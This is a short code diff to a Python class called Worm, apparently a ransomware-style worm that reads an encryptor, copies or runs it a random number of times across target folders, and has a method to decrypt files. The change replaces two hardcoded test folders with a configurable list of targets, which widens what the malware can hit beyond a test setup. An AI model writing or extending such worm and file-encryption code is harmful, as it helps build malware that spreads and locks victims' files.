@@ -42,7 +42,7 @@ class Worm:
         with open(ENCRYPTOR_PATH, "r") as f:
             encryptor = f.read()
 
-        for target in ["C:\\Users\\w0rmer\\Downloads\\test", "C:\\Users\\w0rmer\\Downloads\\test2"]:
+        for target in self.target_dir_list:
             times = random.randrange(1, 25)
             for i in range(times):
                 num = random.randrange(-sys.maxsize, sys.maxsize)
@@ -65,7 +65,7 @@ class Worm:
 
     def decrypt_files(self):
         count = 0
-        for target in ["C:\\Users\\w0rmer\\Downloads\\test\\", "C:\\Users\\w0rmer\\Downloads\\test2\\"]:
+        for target in self.target_dir_list:
             try:
                 for (_, _, filenames) in os.walk(target):
                     break
